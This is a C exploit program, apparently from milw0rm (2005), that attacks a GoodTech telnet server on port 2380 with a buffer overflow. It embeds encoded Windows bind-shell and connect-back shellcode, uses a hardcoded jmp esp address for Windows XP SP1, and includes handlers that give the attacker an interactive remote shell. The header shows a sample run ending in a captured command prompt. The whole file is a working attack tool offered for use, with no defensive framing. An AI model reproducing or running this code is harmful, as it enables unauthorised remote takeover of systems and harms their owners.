/*
 *
 * cybertronic[at]gmx[dot]net
 *
 * offset fixed!
 *
 * [ cybertronic @ GoodTech ] $ gcc -o goodtech_expl goodtech_expl.c
 * [ cybertronic @ GoodTech ] $ ./goodtech_expl
 *
 * Usage
 * -----
 * [ Bindshell    ] ./goodtech_expl <host>
 * [ Reverseshell ] ./goodtech_expl <host> <connectback ip> <connectback port>
 *
 * [ cybertronic @ GoodTech ] $ ./goodtech_expl 192.168.2.103
 *
 *               __              __                   _
 *   _______  __/ /_  ___  _____/ /__________  ____  (_)____
 *  / ___/ / / / __ \/ _ \/ ___/ __/ ___/ __ \/ __ \/ / ___/
 * / /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__
 * \___/\__, /_.___/\___/_/   \__/_/   \____/_/ /_/_/\___/
 *     /____/
 *
 * --[ exploit by : cybertronic - cybertronic[at]gmx[dot]net
 * --[ connecting to 192.168.2.103:2380...done!
 * --[ jmp esp -> 0x71a17bfb [ws2_32.dll WinXP SP1 GER]
 * --[ sending packet [ 10045 bytes ]...done!
 * --[ sleeping 5 seconds before connecting to 192.168.2.103:4444...
 * --[ connecting to 192.168.2.103:4444...done!
 * --[ b0x pwned - h4ve phun
 * Microsoft Windows XP [Version 5.1.2600]
 * (C) Copyright 1985-2001 Microsoft Corp.
 *
 * C:\telnetnt>
 * 
 *
 */


#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

/*
 *
 * definitions
 *
 */

#define PORT	2380

#define RED		"\E[31m\E[1m"
#define GREEN	"\E[32m\E[1m"
#define YELLOW	"\E[33m\E[1m"
#define BLUE	"\E[34m\E[1m"
#define NORMAL	"\E[m"

/*
 *
 * prototypes
 *
 */

int exploit ( int s, unsigned long ip, unsigned short cbport, int option );
int shell ( int s, char* tip, unsigned short cbport );

void connect_to_bindshell ( char* tip, unsigned short bport );
void header ();
void wait ( int sec );
void start_reverse_handler ( char* argv3 );

/*********************
 * Windows Shellcode *
 *********************/
 
/*
 * Type  : bind shellcode
 * Length: 500 bytes
 * Port  : 4444 / 0x115c
 *
 */

unsigned char bindshell[] =
"\xeb\x19\x5e\x31\xc9\x81\xe9\x89\xff\xff\xff\x81\x36\x80\xbf\x32"
"\x94\x81\xee\xfc\xff\xff\xff\xe2\xf2\xeb\x05\xe8\xe2\xff\xff\xff"
"\x03\x53\x06\x1f\x74\x57\x75\x95\x80\xbf\xbb\x92\x7f\x89\x5a\x1a"
"\xce\xb1\xde\x7c\xe1\xbe\x32\x94\x09\xf9\x3a\x6b\xb6\xd7\x9f\x4d"
"\x85\x71\xda\xc6\x81\xbf\x32\x1d\xc6\xb3\x5a\xf8\xec\xbf\x32\xfc"
"\xb3\x8d\x1c\xf0\xe8\xc8\x41\xa6\xdf\xeb\xcd\xc2\x88\x36\x74\x90"
"\x7f\x89\x5a\xe6\x7e\x0c\x24\x7c\xad\xbe\x32\x94\x09\xf9\x22\x6b"
"\xb6\xd7\x4c\x4c\x62\xcc\xda\x8a\x81\xbf\x32\x1d\xc6\xab\xcd\xe2"
"\x84\xd7\xf9\x79\x7c\x84\xda\x9a\x81\xbf\x32\x1d\xc6\xa7\xcd\xe2"
"\x84\xd7\xeb\x9d\x75\x12\xda\x6a\x80\xbf\x32\x1d\xc6\xa3\xcd\xe2"
"\x84\xd7\x96\x8e\xf0\x78\xda\x7a\x80\xbf\x32\x1d\xc6\x9f\xcd\xe2"
"\x84\xd7\x96\x39\xae\x56\xda\x4a\x80\xbf\x32\x1d\xc6\x9b\xcd\xe2"
"\x84\xd7\xd7\xdd\x06\xf6\xda\x5a\x80\xbf\x32\x1d\xc6\x97\xcd\xe2"
"\x84\xd7\xd5\xed\x46\xc6\xda\x2a\x80\xbf\x32\x1d\xc6\x93\x01\x6b"
"\x01\x53\xa2\x95\x80\xbf\x66\xfc\x81\xbe\x32\x94\x7f\xe9\x2a\xc4"
"\xd0\xef\x62\xd4\xd0\xff\x62\x6b\xd6\xa3\xb9\x4c\xd7\xe8\x5a\x96"
"\x80\xae\x6e\x1f\x4c\xd5\x24\xc5\xd3\x40\x64\xb4\xd7\xec\xcd\xc2"
"\xa4\xe8\x63\xc7\x7f\xe9\x1a\x1f\x50\xd7\x57\xec\xe5\xbf\x5a\xf7"
"\xed\xdb\x1c\x1d\xe6\x8f\xb1\x78\xd4\x32\x0e\xb0\xb3\x7f\x01\x5d"
"\x03\x7e\x27\x3f\x62\x42\xf4\xd0\xa4\xaf\x76\x6a\xc4\x9b\x0f\x1d"
"\xd4\x9b\x7a\x1d\xd4\x9b\x7e\x1d\xd4\x9b\x62\x19\xc4\x9b\x22\xc0"
"\xd0\xee\x63\xc5\xea\xbe\x63\xc5\x7f\xc9\x02\xc5\x7f\xe9\x22\x1f"
"\x4c\xd5\xcd\x6b\xb1\x40\x64\x98\x0b\x77\x65\x6b\xd6\x93\xcd\xc2"
"\x94\xea\x64\xf0\x21\x8f\x32\x94\x80\x3a\xf2\xec\x8c\x34\x72\x98"
"\x0b\xcf\x2e\x39\x0b\xd7\x3a\x7f\x89\x34\x72\xa0\x0b\x17\x8a\x94"
"\x80\xbf\xb9\x51\xde\xe2\xf0\x90\x80\xec\x67\xc2\xd7\x34\x5e\xb0"
"\x98\x34\x77\xa8\x0b\xeb\x37\xec\x83\x6a\xb9\xde\x98\x34\x68\xb4"
"\x83\x62\xd1\xa6\xc9\x34\x06\x1f\x83\x4a\x01\x6b\x7c\x8c\xf2\x38"
"\xba\x7b\x46\x93\x41\x70\x3f\x97\x78\x54\xc0\xaf\xfc\x9b\x26\xe1"
"\x61\x34\x68\xb0\x83\x62\x54\x1f\x8c\xf4\xb9\xce\x9c\xbc\xef\x1f"
"\x84\x34\x31\x51\x6b\xbd\x01\x54\x0b\x6a\x6d\xca\xdd\xe4\xf0\x90"
"\x80\x2f\xa2\x04";

/*
 * Type  : connect back shellcode
 * Length: 316 bytes
 * CBIP  : reverseshell[111] ( ^ 0x99999999 )
 * CBPort: reverseshell[118] ( ^ 0x9999 )
 *
 */

unsigned char reverseshell[] =
"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\x99\xE2\xFA"
"\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x62\x99\x99\x99\xC6\xFD\x38\xA9"
"\x99\x99\x99\x12\xD9\x95\x12\xE9\x85\x34\x12\xF1\x91\x12\x6E\xF3"
"\x9D\xC0\x71\x02\x99\x99\x99\x7B\x60\xF1\xAA\xAB\x99\x99\xF1\xEE"
"\xEA\xAB\xC6\xCD\x66\x8F\x12\x71\xF3\x9D\xC0\x71\x1B\x99\x99\x99"
"\x7B\x60\x18\x75\x09\x98\x99\x99\xCD\xF1\x98\x98\x99\x99\x66\xCF"
"\x89\xC9\xC9\xC9\xC9\xD9\xC9\xD9\xC9\x66\xCF\x8D\x12\x41\xF1\xE6"
"\x99\x99\x98\xF1\x9B\x99\x9D\x4B\x12\x55\xF3\x89\xC8\xCA\x66\xCF"
"\x81\x1C\x59\xEC\xD3\xF1\xFA\xF4\xFD\x99\x10\xFF\xA9\x1A\x75\xCD"
"\x14\xA5\xBD\xF3\x8C\xC0\x32\x7B\x64\x5F\xDD\xBD\x89\xDD\x67\xDD"
"\xBD\xA4\x10\xC5\xBD\xD1\x10\xC5\xBD\xD5\x10\xC5\xBD\xC9\x14\xDD"
"\xBD\x89\xCD\xC9\xC8\xC8\xC8\xF3\x98\xC8\xC8\x66\xEF\xA9\xC8\x66"
"\xCF\x9D\x12\x55\xF3\x66\x66\xA8\x66\xCF\x91\xCA\x66\xCF\x85\x66"
"\xCF\x95\xC8\xCF\x12\xDC\xA5\x12\xCD\xB1\xE1\x9A\x4C\xCB\x12\xEB"
"\xB9\x9A\x6C\xAA\x50\xD0\xD8\x34\x9A\x5C\xAA\x42\x96\x27\x89\xA3"
"\x4F\xED\x91\x58\x52\x94\x9A\x43\xD9\x72\x68\xA2\x86\xEC\x7E\xC3"
"\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D"
"\x12\x9A\x5C\x32\xC7\xC0\x5A\x71\x99\x66\x66\x66\x17\xD7\x97\x75"
"\xEB\x67\x2A\x8F\x34\x40\x9C\x57\x76\x57\x79\xF9\x52\x74\x65\xA2"
"\x40\x90\x6C\x34\x75\x60\x33\xF9\x7E\xE0\x5F\xE0";

/*
 *
 * functions
 *
 */

int
exploit ( int s, unsigned long xoredip, unsigned short xoredcbport, int option )
{
	char buffer[10046];
	
	printf ( "--[ jmp esp -> 0x71a17bfb [ws2_32.dll WinXP SP1 GER]\n" );
	if ( option == 0 )
	{
		memcpy ( &reverseshell[111], &xoredip, 4);
		memcpy ( &reverseshell[118], &xoredcbport, 2);

		bzero ( &buffer, sizeof ( buffer ) );
		memset ( buffer, 0x41, 10032 );
		memcpy ( buffer + 46, "\x81\xc4\x54\xf2\xff\xff", 6 );
		memcpy ( buffer + 52, reverseshell, sizeof ( reverseshell ) - 1 );
		strcat ( buffer, "\xfb\x7b\xa1\x71" ); // jmp esp ws2_32.dll WinXP SP1 GER
		strncat ( buffer, "\xe9\xf0\xd8\xff\xff", 5 ); // jmp -10000
		strcat ( buffer, "\r\n\r\n");
	}
	else
	{
		bzero ( &buffer, sizeof ( buffer ) );
		memset ( buffer, 0x41, 10032 );
		memcpy ( buffer + 46, "\x81\xc4\x54\xf2\xff\xff", 6 );
		memcpy ( buffer + 52, bindshell, sizeof ( bindshell ) - 1 );
		strcat ( buffer, "\xfb\x7b\xa1\x71" ); // jmp esp ws2_32.dll WinXP SP1 GER
		strncat ( buffer, "\xe9\xf0\xd8\xff\xff", 5 ); // jmp -10000
		strcat ( buffer, "\r\n\r\n");
	}

	printf ( "--[ sending packet [ %u bytes ]...", strlen ( buffer ) );

	if ( write ( s, buffer, strlen ( buffer ) ) <= 0 )
	{
		printf ( RED "failed!\n" NORMAL);
		return ( 1 );
	}
	printf ( YELLOW "done!\n" NORMAL);
	sleep ( 1 );
	close ( s );
	return ( 0 );
}

int
shell ( int s, char* tip, unsigned short cbport )
{
	int n;
	char buffer[2048];
	fd_set fd_read;

	printf ( "--[" YELLOW " b" NORMAL "0" YELLOW "x " NORMAL "p" YELLOW "w" NORMAL "n" YELLOW "e" NORMAL "d " YELLOW "- " NORMAL "h" YELLOW "4" NORMAL "v" YELLOW "e " NORMAL "p" YELLOW "h" NORMAL "u" YELLOW "n" NORMAL "\n" );

	FD_ZERO ( &fd_read );
	FD_SET ( s, &fd_read );
	FD_SET ( 0, &fd_read );

	while ( 1 )
	{
		FD_SET ( s, &fd_read );
		FD_SET ( 0, &fd_read );

		if ( select ( s + 1, &fd_read, NULL, NULL, NULL ) < 0 )
			break;
		if ( FD_ISSET ( s, &fd_read ) )
		{
			if ( ( n = recv ( s, buffer, sizeof ( buffer ), 0 ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( write ( 1, buffer, n ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		if ( FD_ISSET ( 0, &fd_read ) )
		{
			if ( ( n = read ( 0, buffer, sizeof ( buffer ) ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( send ( s, buffer, n, 0 ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		usleep(10);
	}
}

void
connect_to_bindshell ( char* tip, unsigned short bport )
{
	int s;
	int sec = 5; // change this for fast targets
	struct sockaddr_in remote_addr;
	struct hostent *host_addr;

	if ( ( host_addr = gethostbyname ( tip ) ) == NULL )
	{
		fprintf ( stderr, "cannot resolve \"%s\"\n", tip );
		exit ( 1 );
	}

	remote_addr.sin_family = AF_INET;
	remote_addr.sin_addr   = * ( ( struct in_addr * ) host_addr->h_addr );
	remote_addr.sin_port   = htons ( bport );

	if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
    {
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	printf ("--[ sleeping %d seconds before connecting to %s:%u...\n", sec, tip, bport );
	wait ( sec );
	printf ( "--[ connecting to %s:%u...", tip, bport );
	if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
	{
		printf ( RED "failed!\n" NORMAL);
		exit ( 1 );
	}
	printf ( YELLOW "done!\n" NORMAL);
	shell ( s, tip, bport );
}

void
header ()
{
	printf ( "              __              __                   _           \n" );
	printf ( "  _______  __/ /_  ___  _____/ /__________  ____  (_)____      \n" );
	printf ( " / ___/ / / / __ \\/ _ \\/ ___/ __/ ___/ __ \\/ __ \\/ / ___/  \n" );
	printf ( "/ /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__        \n" );
	printf ( "\\___/\\__, /_.___/\\___/_/   \\__/_/   \\____/_/ /_/_/\\___/  \n" );
	printf ( "    /____/                                                     \n\n" );
	printf ( "--[ exploit by : cybertronic - cybertronic[at]gmx[dot]net\n" );
}

void
start_reverse_handler ( char* argv3 )
{
	int s1, s2;
	unsigned short cbport;
	struct sockaddr_in cliaddr, servaddr;
	socklen_t clilen = sizeof ( cliaddr );

	sscanf ( argv3, "%u", &cbport );
	
	bzero ( &servaddr, sizeof ( servaddr ) );
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
	servaddr.sin_port = htons ( cbport );

	printf ( "--[ starting reverse handler [port: %u]...", cbport );
	if ( ( s1 = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
	{
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	bind ( s1, ( struct sockaddr * ) &servaddr, sizeof ( servaddr ) );
	if ( listen ( s1, 1 ) == -1 )
	{
		printf ( "listen failed!\n" );
		exit ( 1 );
	}
	printf ( YELLOW "done!\n" NORMAL);
	if ( ( s2 = accept ( s1, ( struct sockaddr * ) &cliaddr, &clilen ) ) < 0 )
	{
		printf ( "accept failed!\n" );
		exit ( 1 );
	}
	close ( s1 );
	printf ( "--[ incomming connection from:\t" YELLOW " %s\n" NORMAL, inet_ntoa ( cliaddr.sin_addr ) );
	shell ( s2, ( char* ) inet_ntoa ( cliaddr.sin_addr ), cbport );
	close ( s2 );
}

void
wait ( int sec )
{
	sleep ( sec );
}

int
main ( int argc, char* argv[] )
{

	int s;
	unsigned long xoredip;
	unsigned short xoredcbport;
	struct sockaddr_in remote_addr;
	struct hostent *host_addr;

	if ( argc != 2 )
		if ( argc != 4 )
		{
			fprintf ( stderr, "\nUsage\n-----\n[ Bindshell    ] %s <host>\n[ Reverseshell ] %s <host> <connectback ip> <connectback port>\n\n", argv[0], argv[0] );
			exit ( 1 );
		}

	if ( ( host_addr = gethostbyname ( argv[1] ) ) == NULL )
	{
		fprintf ( stderr, "cannot resolve \"%s\"\n", argv[1] );
		exit ( 1 );
	}
	remote_addr.sin_family = AF_INET;
	remote_addr.sin_addr   = * ( ( struct in_addr * ) host_addr->h_addr );
	remote_addr.sin_port   = htons ( PORT );

	system ( "clear" );
	header ();

	if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
    {
		printf ( "socket failed!\n" );
		exit ( 1 );
	}

	printf ( "--[ connecting to %s:%u...", argv[1], PORT  );
	if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
	{
		printf ( "failed!\n" );
		exit ( 1 );
	}
	printf ( YELLOW "done!\n" NORMAL);
	
	if ( argc == 4 )
	{
		xoredip = inet_addr ( argv[2] ) ^ ( unsigned long ) 0x99999999;
		xoredcbport = htons ( atoi ( argv[3] ) ) ^ ( unsigned short ) 0x9999;
		if ( exploit ( s, xoredip, xoredcbport, 0 ) == 1 )
		{
			printf ( "exploitation FAILED!\n" );
			exit ( 1 );
		}
		start_reverse_handler ( argv[3] );
	}
	else
	{
		if ( exploit ( s, ( unsigned long ) NULL, ( unsigned short ) NULL, 1 ) == 1 )
		{
			printf ( "exploitation FAILED!\n" );
			exit ( 1 );
		}
		connect_to_bindshell ( argv[1], 4444 );
	}
}

// milw0rm.com [2005-04-24]
